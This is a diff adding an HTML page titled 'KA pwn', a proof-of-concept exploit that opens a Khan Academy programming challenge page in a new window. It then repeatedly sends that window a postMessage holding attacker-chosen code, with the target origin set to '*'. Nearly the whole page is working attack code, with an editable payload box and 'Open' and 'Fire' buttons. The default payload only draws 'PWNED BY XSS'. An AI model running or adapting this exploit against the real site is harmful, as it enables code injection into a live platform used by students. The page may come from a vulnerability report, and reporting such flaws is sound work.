@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>KA pwn</title></head>
+<body>
+<h1>KA postMessage code injection</h1>
+<input id="url" size="100" value="https://www.khanacademy.org/computing/computer-programming/programming/drawing-basics/pc/challenge-waving-snowman">
+<br><br>
+<button id="open">1. Open KA</button>
+<button id="fire">2. Fire</button>
+<br><br>
+<textarea id="payload" rows="6" cols="80">background(255,0,0);fill(255,255,255);textSize(28);text("PWNED BY XSS",40,200);text("postMessage attack",40,240);</textarea>
+<pre id="log"></pre>
+<script>
+let w=null;
+const log=m=>document.getElementById('log').textContent+='\n'+m;
+document.getElementById('open').onclick=()=>{
+  w=window.open(document.getElementById('url').value,'v','width=1400,height=950');
+  log('opened — wait 5s');
+};
+document.getElementById('fire').onclick=()=>{
+  if(!w){log('open first');return;}
+  const p=JSON.stringify({code:document.getElementById('payload').value,restart:true});
+  w.postMessage(p,'*');
+  setTimeout(()=>w.postMessage(p,'*'),500);
+  setTimeout(()=>w.postMessage(p,'*'),1500);
+  setTimeout(()=>w.postMessage(p,'*'),3000);
+  log('fired '+p.length+' bytes');
+};
+</script>
+</body></html>
